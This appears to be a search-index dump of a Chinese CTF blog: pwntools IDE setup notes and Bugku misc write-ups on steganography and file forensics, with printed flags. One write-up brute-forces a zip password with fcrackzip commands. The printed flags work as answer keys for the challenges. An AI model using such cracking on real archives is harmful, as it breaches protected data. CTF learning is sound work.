\u597d\u4e86\uff0c\u6211\u5047\u88c5\u4f60\u5df2\u7ecf\u65b0\u5efa\u597d\u4e86\u4e00\u4e2aProject\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u53ef\u4ee5\u5728\u53f3\u4e0a\u89d2\u6216 Settings \u4e2d\u627e\u5230 Project Structure (Ctrl+Alt+Shift+S) \uff0c\u7136\u540e\u9009\u4e2d\u5de6\u4fa7\u680f\u7684 Platform Settings->SDKs \uff0c\u70b9\u51fb\u52a0\u53f7\u5e76\u9009\u4e2d Python SDK \uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u6bd4\u8f83\u96be\u53d7\u7684\u662f\uff0c\u57282018.3\u8fd8\u662f\u6709 WSL \u9009\u9879\u7684\uff0c\u5347\u7ea7\u52302019.1\uff08\u63d2\u4ef6\u4e5f\u66f4\u65b0\u4e86\uff09\u5374\u6ca1\u6709\u4e86\uff0c\u8fd8\u6ca1\u6709\u53bb\u67e5\u5177\u4f53\u539f\u56e0\uff0c\u5e0c\u671b\u8fd9\u662f\u6682\u65f6\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u5148\u4f7f\u7528 SSH Interpreter \u4e00\u4e0b\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u4fdd\u8bc1WSL\u4e0a\u5df2\u7ecf\u5f00\u542f\u4e86SSH\u670d\u52a1\uff1a \u5982\u679c\u6ca1\u6709\uff0c\u4f60\u5e94\u5f53\u68c0\u67e5\uff1a\u662f\u5426\u5df2\u7ecf\u5b89\u88c5\u4e86\u4f8b\u5982openssh-server\u3001\u662f\u5426\u6ca1\u6709\u542f\u52a8\u670d\u52a1 1 sudo service ssh start \u3001\u6216\u662f\u914d\u7f6e\u6587\u4ef6\u5b58\u5728\u95ee\u9898 1 sudo nano / etc / ssh / sshd_config \uff1f\u6211\u89c9\u5f97\u4f60\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002 \u8fd9\u4e9b\u90fd\u51c6\u5907\u5c31\u7eea\u4e86\u4f60\u5c31\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u4fe1\u606f\u586b\u5165\u521a\u521a\u6253\u5f00\u7684\u7a97\u53e3\u4e2d\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u4e0b\u4e00\u6b65\u4f60\u9700\u8981\u586b\u5165\u5bc6\u7801\u7b49\u4fe1\u606f\uff0c\u5728\u8fd9\u4e9b\u4e4b\u540e\u4f60\u5e94\u8be5\u5c31\u5b8c\u6210\u4e86\u5b83\u7684\u914d\u7f6e\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u91cc\uff1a \uff08\u5982\u679c\u4f60\u5df2\u7ecf\u5728WSL\u4e0a\u5b89\u88c5\u597d\u4e86pwntools\u5c31\u65e0\u89c6\u6389\u8fd9\u4e00\u884c\u3002\uff09\u70b9\u51fb\u53f3\u4fa7\u7684\u52a0\u53f7\uff0c\u4f60\u53ef\u4ee5\u641c\u7d22pwntools\u7136\u540e\u5b89\u88c5\u5b83\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728WSL\u7684\u7ec8\u7aef\u91cc\u5b89\u88c5\u5b83\u3002 \u8fd9\u4e2a\u65f6\u5019\u4f60\u5e94\u8be5\u53ef\u4ee5\u56de\u5230\u7f16\u8f91\u5668\u5f00\u59cb\u5199\u7a0b\u5e8f\u4e86\uff0c\u4e0d\u8fc7\uff0c\u4f60\u53ef\u80fd\u4f3c\u4e4e\u53d1\u73b0\u6709\u54ea\u91cc\u4e0d\u5bf9......","title":"\u5bf9\u4e8eIDEA"},{"location":"ctf_tools/pwntools/#pycharm-professional","text":"\u55ef\uff0c\u5148\u629b\u4e0b\u521a\u521a\u4e0a\u9762\u53ef\u80fd\u7ffb\u8f66\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6765\u770b\u770bPyCharm\u5982\u4f55\u6298\u817e\u3002 \u7531\u4e8e\u6211\u6ca1\u6709\u88c5PyCharm\uff0c\u6240\u4ee5...\u8bf7\u770b \u8fd9\u91cc \u3002 \u4e5f\u662f\u627e\u5230 Project Structure \u7136\u540e Add Python Interpreter \uff0c\u53ea\u662f\u8fd9\u6b21\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9 WSL \uff0c\u4f3c\u4e4e\u53ef\u4ee5\u7701\u53bb\u5f88\u591a\u4e8b\u3002\u540c\u6837\uff0c\u5b89\u88c5\u597d\u5305\u4e4b\u540e\u5c31\u53ef\u4ee5\u56de\u5230\u7f16\u8f91\u5668\u5f00\u59cb\u5de5\u4f5c\u4e86\u3002","title":"\u5bf9\u4e8ePyCharm Professional"},{"location":"ctf_tools/pwntools/#unresolved-reference-pwn","text":"\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\u3002\u81f3\u5c11\uff0c\u6211\u88ab\u56f0\u6270\u4e86\u5f88\u4e45\u5e76\u4e14\u627e\u4e0d\u5230\u89e3\u51b3\u65b9\u6cd5\u4ee5\u81f3\u4e8e\u6709\u4e00\u6bb5\u65f6\u95f4\u90fd\u6ca1\u6709\u4f7f\u7528\u5b83\uff08\u597d\u5427\u5176\u5b9e\u6211\u65e9\u5c31\u8be5\u53bb\u8bba\u575b\u95ee\u95ee\u7684\uff09\u3002 \u8fd9\u4e2a\u95ee\u9898\u7684\u5177\u4f53\u8868\u73b0\u5e94\u8be5\u662f\uff0c\u4f8b\u5982 1 from pwn import * \u4f1a\u6709\u9519\u8bef\u4ea7\u751f\uff1a Unresolved reference 'pwn' \u8fd9\u4f1a\u5bfc\u81f4\u540e\u7eed\u548cpwntools\u76f8\u5173\u7684\u4ee3\u7801\u68c0\u67e5\u90fd\u51fa\u73b0\u95ee\u9898\u3002\u867d\u7136\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u5730 Run \u8d77\u6765\uff0c\u4f46\u662f\u8fd9\u5f88\u5f71\u54cd\u4f53\u9a8c\u3002\u4e0d\u8fc7\u4eca\u5929\u6211\u7a81\u7136\u53d1\u73b0\u4e86\u89e3\u51b3\u529e\u6cd5\uff0c\u5728\u8fd9\u91cc\uff1a Why PyCharm can't resolve reference for a remote Docker interpreter? Hi! Could you please invalidate caches with File | Invalidate Caches & Restart ? Has it helped? Pavel Karateev Created June 16, 2017 16:34 ...\u91cd\u542f\u540e\uff0c\u4e00\u5207\u5c31\u8fd9\u4e48\u6062\u590d\u4e86\u6b63\u5e38... ...\u4e0d\u77e5\u9053\u8be5\u8bf4\u4ec0\u4e48\u597d\u4e86...","title":"Unresolved reference 'pwn'"},{"location":"ctf_tools/pwntools/#_2","text":"\u5bf9\u4e86\uff0c\u522b\u5fd8\u4e86 Add Python Interpreter \u91cc\u8fd8\u6709\u5f88\u591a\u9009\u9879\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5229\u7528\u5b83\u4eec\u6765\u5b9e\u73b0\u5728Windows\u4e0b\u73a9pwntools\uff0c\u800c\u4e14 SSH Interpreter \u4e5f\u4e0d\u4e00\u5b9a\u8981\u8fdeWSL\uff0c\u5404\u4f4d\u5c31\u81ea\u884c\u53d1\u6325\u597d\u5566\uff01","title":"\u53e6\u5916"},{"location":"ctf_writeup/bugku/Linux2/","text":"\u7ed9\u4f60\u70b9\u63d0\u793a\u5427\uff1akey\u7684\u683c\u5f0f\u662fKEY{} \u9898\u76ee\u5730\u5740\uff1a\u94fe\u63a5: http://pan.baidu.com/s/1skJ6t7R \u5bc6\u7801: s7jy \u5b58\u6863\uff1a brave.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u5f97\u5230\u4e00\u4e2a20000K\u7684brave\uff0c\u76f4\u63a5\u4e0aforemost\uff0c\u641e\u51fa\u4e86\u4e00\u5f20\u56fe\u7247\uff1a \u8981\u63d0\u4ea4\u624d\u53d1\u73b0\u9898\u76ee\u8bf4\u4e86\u683c\u5f0f\u662fKEY{}\uff0c\u5f97\uff0c\u4e0d\u7528\u4ea4\u4e86\uff0c\u4e0d\u8fc7\uff1a 1 strings . / brave | grep KEY { \u62ff\u5230\u4e86\uff1a 1 KEY { 24 f3627a86fc740a7f36ee2c7a1c124a }","title":"Linux2"},{"location":"ctf_writeup/bugku/Linux2/#_1","text":"\u89e3\u538b\u5f97\u5230\u4e00\u4e2a20000K\u7684brave\uff0c\u76f4\u63a5\u4e0aforemost\uff0c\u641e\u51fa\u4e86\u4e00\u5f20\u56fe\u7247\uff1a \u8981\u63d0\u4ea4\u624d\u53d1\u73b0\u9898\u76ee\u8bf4\u4e86\u683c\u5f0f\u662fKEY{}\uff0c\u5f97\uff0c\u4e0d\u7528\u4ea4\u4e86\uff0c\u4e0d\u8fc7\uff1a 1 strings . / brave | grep KEY { \u62ff\u5230\u4e86\uff1a 1 KEY { 24 f3627a86fc740a7f36ee2c7a1c124a }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/color/","text":"\u4f60\u89c1\u8fc7\u5f69\u8679\u5417\uff1f \u6765\u6e90\uff1a\u7b2c\u4e03\u5c4a\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b 81cf84c2-0901-46d8-80c7-f0844e7e5253.zip \u5b58\u6863\uff1a 81cf84c2-0901-46d8-80c7-f0844e7e5253.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u5f97\u52307\u5f20\u4e0d\u540c\u989c\u8272\u7684png\uff0cStegsolve\u770b\u5230\u4f4e\u901a\u9053\u6709\u95ee\u9898\uff1a \u518d\u770b\u4e00\u5f20\uff1a \u61d2\u5f97\u4e00\u4e2a\u4e2a\u7ffb\u4e86\uff0c\u5199\u4e2a\u5c0f\u4e1c\u897f\uff08\u5148\u63d0\u793a\u4e00\u4e0b\u4e0b\u9762\u8fd9\u73a9\u610f\u513f\u6ca1\u6cd5\u7528\uff0c\u522b\u590d\u5236\u4e86\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <opencv2/opencv.hpp> int main () { for ( size_t i = 0 ; i < 7 ; ++ i ) { std :: string filename ( \"./\" + std :: to_string ( i ) + \".png\" ); cv :: Mat src , dst ( 400 , 380 , CV_8UC1 ); src = cv :: imread ( filename . c_str ()); for ( int ir = 0 ; ir < 380 ; ++ ir ) { for ( int ic = 0 ; ic < 400 ; ++ ic ) { dst . at < uchar > ( ir , ic ) = ( src . at < cv :: Vec3b > ( ir , ic )[ 2 ] & 1 ) == 1 ? static_cast < uchar > ( 255 ) : static_cast < uchar > ( 0 ); } } filename = \"./\" + std :: to_string ( i ) + \".decode.png\" ; cv :: imwrite ( filename , dst ); } return 0 ; } \u8d70\u8d77... \u7cdf\u7cd5\uff0c\u597d\u50cf\u7ffb\u8f66\uff1a \u5934\u90e8\u6709\u95ee\u9898\uff0c\u4f30\u8ba1\u9ad8\u5ea6\u88ab\u6539\u8fc7\uff0c\u90a3\u5c31TweakPNG\u6539\u56de\u6765\u5148\uff0c\u518d\u542f\u52a8\uff1a","title":"Color"},{"location":"ctf_writeup/bugku/color/#_1","text":"\u89e3\u538b\u5f97\u52307\u5f20\u4e0d\u540c\u989c\u8272\u7684png\uff0cStegsolve\u770b\u5230\u4f4e\u901a\u9053\u6709\u95ee\u9898\uff1a \u518d\u770b\u4e00\u5f20\uff1a \u61d2\u5f97\u4e00\u4e2a\u4e2a\u7ffb\u4e86\uff0c\u5199\u4e2a\u5c0f\u4e1c\u897f\uff08\u5148\u63d0\u793a\u4e00\u4e0b\u4e0b\u9762\u8fd9\u73a9\u610f\u513f\u6ca1\u6cd5\u7528\uff0c\u522b\u590d\u5236\u4e86\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <opencv2/opencv.hpp> int main () { for ( size_t i = 0 ; i < 7 ; ++ i ) { std :: string filename ( \"./\" + std :: to_string ( i ) + \".png\" ); cv :: Mat src , dst ( 400 , 380 , CV_8UC1 ); src = cv :: imread ( filename . c_str ()); for ( int ir = 0 ; ir < 380 ; ++ ir ) { for ( int ic = 0 ; ic < 400 ; ++ ic ) { dst . at < uchar > ( ir , ic ) = ( src . at < cv :: Vec3b > ( ir , ic )[ 2 ] & 1 ) == 1 ? static_cast < uchar > ( 255 ) : static_cast < uchar > ( 0 ); } } filename = \"./\" + std :: to_string ( i ) + \".decode.png\" ; cv :: imwrite ( filename , dst ); } return 0 ; } \u8d70\u8d77... \u7cdf\u7cd5\uff0c\u597d\u50cf\u7ffb\u8f66\uff1a \u5934\u90e8\u6709\u95ee\u9898\uff0c\u4f30\u8ba1\u9ad8\u5ea6\u88ab\u6539\u8fc7\uff0c\u90a3\u5c31TweakPNG\u6539\u56de\u6765\u5148\uff0c\u518d\u542f\u52a8\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/convert/","text":"\u4f5c\u8005\uff1aNIPC 1.txt \u5b58\u6863\uff1a 1.txt \u89e3\u51b3\u65b9\u6848 \u6587\u6863\u662f\u5f88\u957f\u7684\u4e00\u6bb5\u4e8c\u8fdb\u5236\uff0c\u628a\u957f\u5ea6\u8d28\u56e0\u6570\u5206\u89e3\u7136\u540e\u5c1d\u8bd5\u753b\u56fe\u6ca1\u6709\u7ed3\u679c\uff0c\u540e\u6765\u53d1\u73b0\u5e94\u8be5\u628a\u5b83\u4e8c\u8fdb\u5236\u5199\u5165,\u800c\u4e0d\u662f\u8ba9\u5b83\u6309\u5b57\u7b26\u5f62\u5f0f\u5b58\u6863\uff0c\u4e8e\u662f\u6709\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <fstream> int main () { std :: ifstream inputFileStream ( \"./1.txt\" ); std :: ofstream outputFileStream ( \"./1.bin\" ); while ( ! inputFileStream . eof ()) { char ch = 0 ; for ( int i = 0 ; i < 8 ; ++ i ) { char bit ; inputFileStream >> bit ; ch = ( ch << 1 ) + ( bit - '0' ); } outputFileStream << ch ; } return 0 ; } \u53ef\u4ee5\u89e3\u538b\u8be5\u6587\u4ef6\uff0c\u5f97\u5230\u4e00\u4e2akey.jpg\u3002\u5728\u6587\u4ef6\u5c5e\u6027\u4e2d\u53ef\u4ee5\u770b\u5230\u53ef\u7591\u7684\u4e3b\u9898\uff1a \u590d\u5236\u51fa\u6765\uff1a 1 ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0 = BASE64\u89e3\u5f00\uff1a 1 flag { 01 a25ea3fd6349c6e635a1d0196e75fb }","title":"convert"},{"location":"ctf_writeup/bugku/convert/#_1","text":"\u6587\u6863\u662f\u5f88\u957f\u7684\u4e00\u6bb5\u4e8c\u8fdb\u5236\uff0c\u628a\u957f\u5ea6\u8d28\u56e0\u6570\u5206\u89e3\u7136\u540e\u5c1d\u8bd5\u753b\u56fe\u6ca1\u6709\u7ed3\u679c\uff0c\u540e\u6765\u53d1\u73b0\u5e94\u8be5\u628a\u5b83\u4e8c\u8fdb\u5236\u5199\u5165,\u800c\u4e0d\u662f\u8ba9\u5b83\u6309\u5b57\u7b26\u5f62\u5f0f\u5b58\u6863\uff0c\u4e8e\u662f\u6709\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <fstream> int main () { std :: ifstream inputFileStream ( \"./1.txt\" ); std :: ofstream outputFileStream ( \"./1.bin\" ); while ( ! inputFileStream . eof ()) { char ch = 0 ; for ( int i = 0 ; i < 8 ; ++ i ) { char bit ; inputFileStream >> bit ; ch = ( ch << 1 ) + ( bit - '0' ); } outputFileStream << ch ; } return 0 ; } \u53ef\u4ee5\u89e3\u538b\u8be5\u6587\u4ef6\uff0c\u5f97\u5230\u4e00\u4e2akey.jpg\u3002\u5728\u6587\u4ef6\u5c5e\u6027\u4e2d\u53ef\u4ee5\u770b\u5230\u53ef\u7591\u7684\u4e3b\u9898\uff1a \u590d\u5236\u51fa\u6765\uff1a 1 ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0 = BASE64\u89e3\u5f00\uff1a 1 flag { 01 a25ea3fd6349c6e635a1d0196e75fb }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/","text":"\u7b7e\u5230\u9898 \u5173\u6ce8\u5fae\u4fe1\u516c\u4f17\u53f7\uff1aBugku \u5373\u53ef\u83b7\u53d6flag \u4e0b\u9762\u4e5f\u6709\u4e8c\u7ef4\u7801 \u89e3\u51b3\u65b9\u6848 1 flag { BugKu - Sec - pwn ! } \u8fd9\u662f\u4e00\u5f20\u5355\u7eaf\u7684\u56fe\u7247 http://123.206.87.240:8002/misc/1.jpg \u5b58\u6863\uff1a 1.jpg FLAG\u5728\u54ea\u91cc\uff1f\uff1f \u89e3\u51b3\u65b9\u6848 \u770b\u770b\u6587\u4ef6\u672b\u5c3e\uff1a 1 hexdump - C . / 1 . jpg \u6709\u4e00\u4e32HTML\u7f16\u7801\uff1a 1 &#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125; \u89e3\u7801\u5c31\u5f97\u5230\uff1a 1 key { you are right } \u9690\u5199 2.rar \u5b58\u6863\uff1a 2.rar \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u540e\u53d1\u73b0\u4e00\u4e2a2.png\uff0c\u542f\u52a8StegSolve\u540e\u6bcf\u4e2a\u56fe\u5c42\u770b\u4e0d\u51fa\u6709\u4ec0\u4e48\u5f02\u5e38\uff0c\u4e8e\u662f\u8bd5\u8bd5TweakPNG\u3002\u6253\u5f00\u56fe\u7247\u65f6\u53d1\u73b0\uff1a \u679c\u7136\u6709\u95ee\u9898\uff0c\u4e8e\u662f\u6539\u4e0b\u9ad8\u5ea6\uff1a \u4fdd\u5b58\u540e\u5c31\u53ef\u4ee5\u770b\u5230flag\uff1a telnet http://123.206.87.240:8002/misc/telnet/1.zip key\u683c\u5f0fflag{xxxxxxxxxxxxxxxxxxxxxxxxxxx} \u5b58\u6863\uff1a 1.zip \u89e3\u51b3\u65b9\u6848 \u6253\u5f00\u538b\u7f29\u5305\uff0c\u5185\u542b\u4e00\u4e2anetworking.pcap\uff0c\u76f4\u63a5Wireshark\u6253\u5f00\u7136\u540e\u8ffd\u8e2aTCP\u6d41\uff1a \u773c\u89c1\u975e\u5b9e(ISCCCTF) zip \u5b58\u6863\uff1a zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u6253\u4e0d\u5f00\u7684\u6587\u6863\uff0c\u4f30\u8ba1\u88ab\u635f\u574f\u4e86\uff0c\u76f4\u63a5\u75287-Zip\u628a\u6587\u6863\u4f5c\u4e3a\u538b\u7f29\u5305\u6253\u5f00\uff0c\u76f4\u51fb/word/document.xml\uff1a \u5e94\u8be5\u4e0d\u7528\u6211\u518d\u8bf4\u4e00\u904d\u4e86... \u554a\u54d2 \u6709\u8da3\u7684\u8868\u60c5\u5305 \u6765\u6e90\uff1a\u7b2c\u4e03\u5c4a\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b 1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip \u5b58\u6863\uff1a 1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2aada.jpg\uff0cbinwalk\u53d1\u73b0\u5185\u542b\u5176\u5b83\u6587\u4ef6\uff0c\u7136\u540eforemost\u5c1d\u8bd5\u5c06\u5176\u5206\u79bb\uff0c\u5f97\u5230\u4e00\u4e2a\u52a0\u5bc6\u4e86\u7684\u538b\u7f29\u5305\u3002\u5176\u5b9ezip\u53ef\u4ee5\u5c1d\u8bd5\u7206\u7834\u7684\uff0c\u4f46\u6211\u4eec\u8fd8\u662f\u6765\u627e\u4e00\u4e0b\u5bc6\u7801\uff1a \u5947\u602a\u7684\u76f8\u673a\u578b\u53f7\uff1a 1 73646 E6973635F32303138 \u628a\u5b8316\u8fdb\u5236\u8f6c\u5b57\u7b26\uff1a 1 sdnisc_2018 \u62ff\u53bb\u89e3\u538b\u521a\u521a\u7684zip\uff1a 1 flag { 3 XiF_iNf0rM @ti0n }","title":"MISC 50"},{"location":"ctf_writeup/bugku/misc_50/#_1","text":"\u5173\u6ce8\u5fae\u4fe1\u516c\u4f17\u53f7\uff1aBugku \u5373\u53ef\u83b7\u53d6flag \u4e0b\u9762\u4e5f\u6709\u4e8c\u7ef4\u7801","title":"\u7b7e\u5230\u9898"},{"location":"ctf_writeup/bugku/misc_50/#_2","text":"1 flag { BugKu - Sec - pwn ! }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/#_3","text":"http://123.206.87.240:8002/misc/1.jpg \u5b58\u6863\uff1a 1.jpg FLAG\u5728\u54ea\u91cc\uff1f\uff1f","title":"\u8fd9\u662f\u4e00\u5f20\u5355\u7eaf\u7684\u56fe\u7247"},{"location":"ctf_writeup/bugku/misc_50/#_4","text":"\u770b\u770b\u6587\u4ef6\u672b\u5c3e\uff1a 1 hexdump - C . / 1 . jpg \u6709\u4e00\u4e32HTML\u7f16\u7801\uff1a 1 &#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125; \u89e3\u7801\u5c31\u5f97\u5230\uff1a 1 key { you are right }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/#_5","text":"2.rar \u5b58\u6863\uff1a 2.rar","title":"\u9690\u5199"},{"location":"ctf_writeup/bugku/misc_50/#_6","text":"\u89e3\u538b\u540e\u53d1\u73b0\u4e00\u4e2a2.png\uff0c\u542f\u52a8StegSolve\u540e\u6bcf\u4e2a\u56fe\u5c42\u770b\u4e0d\u51fa\u6709\u4ec0\u4e48\u5f02\u5e38\uff0c\u4e8e\u662f\u8bd5\u8bd5TweakPNG\u3002\u6253\u5f00\u56fe\u7247\u65f6\u53d1\u73b0\uff1a \u679c\u7136\u6709\u95ee\u9898\uff0c\u4e8e\u662f\u6539\u4e0b\u9ad8\u5ea6\uff1a \u4fdd\u5b58\u540e\u5c31\u53ef\u4ee5\u770b\u5230flag\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/#telnet","text":"http://123.206.87.240:8002/misc/telnet/1.zip key\u683c\u5f0fflag{xxxxxxxxxxxxxxxxxxxxxxxxxxx} \u5b58\u6863\uff1a 1.zip","title":"telnet"},{"location":"ctf_writeup/bugku/misc_50/#_7","text":"\u6253\u5f00\u538b\u7f29\u5305\uff0c\u5185\u542b\u4e00\u4e2anetworking.pcap\uff0c\u76f4\u63a5Wireshark\u6253\u5f00\u7136\u540e\u8ffd\u8e2aTCP\u6d41\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/#isccctf","text":"zip \u5b58\u6863\uff1a zip","title":"\u773c\u89c1\u975e\u5b9e(ISCCCTF)"},{"location":"ctf_writeup/bugku/misc_50/#_8","text":"\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u6253\u4e0d\u5f00\u7684\u6587\u6863\uff0c\u4f30\u8ba1\u88ab\u635f\u574f\u4e86\uff0c\u76f4\u63a5\u75287-Zip\u628a\u6587\u6863\u4f5c\u4e3a\u538b\u7f29\u5305\u6253\u5f00\uff0c\u76f4\u51fb/word/document.xml\uff1a \u5e94\u8be5\u4e0d\u7528\u6211\u518d\u8bf4\u4e00\u904d\u4e86...","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_50/#_9","text":"\u6709\u8da3\u7684\u8868\u60c5\u5305 \u6765\u6e90\uff1a\u7b2c\u4e03\u5c4a\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b 1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip \u5b58\u6863\uff1a 1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip","title":"\u554a\u54d2"},{"location":"ctf_writeup/bugku/misc_50/#_10","text":"\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2aada.jpg\uff0cbinwalk\u53d1\u73b0\u5185\u542b\u5176\u5b83\u6587\u4ef6\uff0c\u7136\u540eforemost\u5c1d\u8bd5\u5c06\u5176\u5206\u79bb\uff0c\u5f97\u5230\u4e00\u4e2a\u52a0\u5bc6\u4e86\u7684\u538b\u7f29\u5305\u3002\u5176\u5b9ezip\u53ef\u4ee5\u5c1d\u8bd5\u7206\u7834\u7684\uff0c\u4f46\u6211\u4eec\u8fd8\u662f\u6765\u627e\u4e00\u4e0b\u5bc6\u7801\uff1a \u5947\u602a\u7684\u76f8\u673a\u578b\u53f7\uff1a 1 73646 E6973635F32303138 \u628a\u5b8316\u8fdb\u5236\u8f6c\u5b57\u7b26\uff1a 1 sdnisc_2018 \u62ff\u53bb\u89e3\u538b\u521a\u521a\u7684zip\uff1a 1 flag { 3 XiF_iNf0rM @ti0n }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/misc_60/","text":"\u53c8\u4e00\u5f20\u56fe\u7247\uff0c\u8fd8\u5355\u7eaf\u5417 http://123.206.87.240:8002/misc/2.jpg \u597d\u50cf\u548c\u4e0a\u4e00\u4e2a\u6709\u70b9\u4e0d\u4e00\u6837 \u5b58\u6863\uff1a 2.jpg \u89e3\u51b3\u65b9\u6848 binwalk\u53d1\u73b0\u5185\u542b\u4e24\u5f20\u56fe\u7247\uff0cforemost\u63d0\u53d6\u4e00\u4e0b\uff1a \u771f\u591f\u957f\u7684\uff1a 1 falg { NSCTF_e6532a34928a3d1dadd0b049d5a3cc57 } \u731c http://123.206.87.240:8002/misc/cai/QQ20170221-132626.png flag\u683c\u5f0fkey{\u67d0\u4eba\u540d\u5b57\u5168\u62fc} \u5b58\u6863\uff1a QQ20170221-132626.png \u89e3\u51b3\u65b9\u6848 \u641e\u4e86\u534a\u5929\u5565\u7528\u90fd\u6ca1\u6709\uff0c\u7ed3\u679c\u53d1\u73b0\u5927\u5bb6\u90fd\u662f\u4e22\u5230\u8bc6\u56fe\u91cc\u9762\uff1f 1 key { liuyifei } \u670d\u4e86... \u5bbd\u5e26\u4fe1\u606f\u6cc4\u9732 flag\u683c\u5f0f\uff1a flag{\u5bbd\u5e26\u7528\u6237\u540d} conf.bin \u5b58\u6863\uff1a conf.bin \u89e3\u51b3\u65b9\u6848 \u4e0aRouterPassView\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\uff0c\u4f46\u662f\u4f3c\u4e4e\u6ca1\u627e\u5230\u6e90\u7801...\u633a\u597d\u5947\u539f\u7406... \u9690\u51992 Welcome_.jpg \u5b58\u6863\uff1a Welcome_,jpg \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u7684\u6587\u4ef6\uff0c\u5c5e\u6027\u91cc\u4f3c\u4e4e\u6709\u63d0\u793a\uff0c \u5b8c\u5168\u6ca1\u770b\u61c2\uff0c\u76f4\u63a5binwalk\u770b\u770b\u3002\u5185\u542bzip\u6587\u4ef6\uff0cforemost\u63d0\u53d6\uff0c\u89e3\u538bzip\u540e\u6709flag.rar\u548c\u63d0\u793a.jpg\u3002\u597d\u5427\u63d0\u793a\u4e5f\u6ca1\u770b\u61c2\uff0c\u6211\u5c31\u770b\u61c2\u4e86\u5bc6\u7801\u662f3\u4f4d\u6570\u5b57\uff0c\u90a3\u5c31\u76f4\u63a5\u7206\u7834\u597d\u4e86\u3002 \u751f\u6210\u4e00\u4e0b\u4e09\u4f4d\u6570\u5b57\u7684\u5b57\u5178\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 #include <iostream> #include <fstream> #include <iomanip> int main () { std :: ofstream outputFileStream ( \"./dict_3numbers.txt\" ); for ( size_t i = 0 ; i < 1000 ; ++ i ) { outputFileStream << std :: setw ( 3 ) << std :: setfill ( '0' ) << i << std :: endl ; } outputFileStream . close (); return 0 ; } \u7136\u540e\uff1a 1 fcrackzip - b - D - p . / dict_3numbers . txt . / flag . rar \u6216\u8005\u76f4\u63a5\uff1a 1 fcrackzip - b - c \"1\" - l 3 . / flag . rar \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 possible pw found : 035 () possible pw found : 337 () possible pw found : 728 () possible pw found : 871 () 871\u89e3\u5f00\u538b\u7f29\u5305\uff0c\u6709\u4e2a3.jpg\uff0c\u6ca1\u5565\u4fe1\u606f\uff0c\u8bd5\u8bd5\uff1a 1 strings . / 3 . jpg \u672b\u5c3e\u6709\u4e1c\u897f\uff0c\u63d0\u4ea4\u4e86\u4e0d\u5bf9\uff1a 1 f1 @g { eTB1IEFyZSBhIGhAY2tlciE = } BASE64\u89e3\u5f00\uff1a 1 f1 @g { y0u Are a h @cker !} \u591a\u79cd\u65b9\u6cd5\u89e3\u51b3 \u5728\u505a\u9898\u8fc7\u7a0b\u4e2d\u4f60\u4f1a\u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\u56fe\u7247 http://123.206.87.240:8002/misc/3.zip \u5b58\u6863\uff1a 3.zip \u89e3\u51b3\u65b9\u6848 \u76f4\u63a5\uff1a 1 strings . / KEY . exe 